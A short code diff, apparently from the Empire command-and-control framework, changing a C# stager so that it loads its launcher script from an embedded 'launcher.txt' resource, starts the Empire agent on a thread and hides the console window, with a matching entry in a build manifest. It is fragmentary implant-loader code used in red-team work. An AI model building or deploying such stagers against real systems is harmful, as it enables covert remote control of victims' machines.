@@ -13,6 +13,7 @@
     using System;
     using System.IO.Compression;
     using System.IO;
+    using System.Linq;
     using System.Text;
     using System.Collections;
     using System.Reflection;
@@ -48,14 +49,23 @@
                                 return Assembly.Load(assemblyData);
                             }
                         };
-            string B64PyCode = "{{ REPLACE_LAUNCHER }}";
+            
+            var assembly = Assembly.GetExecutingAssembly();
+            var resourceName = "launcher.txt";
+
+            string[] names = assembly.GetManifestResourceNames();
+
+            StreamReader reader = new StreamReader(assembly.GetManifestResourceStream(resourceName));
+            string script = reader.ReadToEnd();
+
             ShowConsoleWindow();
             new Thread(() =>
             {
-                Empire.Agent(B64PyCode);
+                Empire.Agent(script);
             }).Start();
             HideConsoleWindow();
         }
+
         public static void ShowConsoleWindow()
         {
             var handle = GetConsoleWindow();
@@ -149,5 +159,7 @@
         Location: Microsoft.Dynamic.dll
       - Name: Lib.zip
         Location: Lib.zip
+      - Name: launcher.txt
+        Location: launcher.txt
   ReferenceAssemblies: []
   EmbeddedResources: []
